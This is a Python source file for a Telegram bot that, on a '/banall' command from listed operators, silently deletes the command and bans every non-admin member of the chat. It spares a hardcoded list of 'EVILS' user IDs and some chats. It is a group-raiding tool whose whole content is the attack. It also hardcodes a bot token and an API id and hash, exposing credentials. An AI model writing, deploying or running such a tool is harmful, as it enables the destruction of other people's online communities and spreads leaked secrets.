import logging
from decouple import config
from os import getenv
from telethon import TelegramClient, events
from telethon.tl.types import ChatBannedRights, ChannelParticipantsAdmins
from telethon.tl.functions.channels import EditBannedRequest
from telethon.tl.types import (
    ChannelParticipantsAdmins,
    ChatBannedRights,
)

BOT_TOKEN = config("5889234320:AAHIHuwTbejv-kysiT6DU4iAX3qyRZbQhbs", None)
SUDO_USERS = list(map(int, getenv("SUDO").split()))
EVILS = [1827586893, 1953656325, 5797689958, 5547355973, 5345918225]
ALTRONS = [-1001777776331, -1001802248291, -1001443562643]
SUDO_USERS.append(1827586893)

RIGHTS = ChatBannedRights(
    until_date=None,
    view_messages=True,
    send_messages=True,
    send_media=True,
    send_stickers=True,
    send_gifs=True,
    send_games=True,
    send_inline=True,
    embed_links=True,
)

logging.basicConfig(level=logging.INFO)
Evil = TelegramClient('EVIL', 18136872, "312d861b78efcd1b02183b2ab52a83a4").start(bot_token=BOT_TOKEN)


@Evil.on(events.NewMessage(pattern="^/banall"))
async def banall(event):
   if event.sender_id in SUDO_USERS:
        await event.delete()
        admins = await event.client.get_participants(event.chat_id, filter=ChannelParticipantsAdmins)
        admins_id = [i.id for i in admins]
        all = 0
        bann = 0
        if int(event.chat_id) in ALTRONS:
            return
        async for user in event.client.iter_participants(event.chat_id):
            all += 1
            try:
                if user.id not in admins_id and user.id not in EVILS:
                    await event.client(EditBannedRequest(event.chat_id, user.id, RIGHTS))
                    bann += 1
            except Exception as e:
                pass


print("TEAM LEGENDZ OP")

Evil.run_until_disconnected()
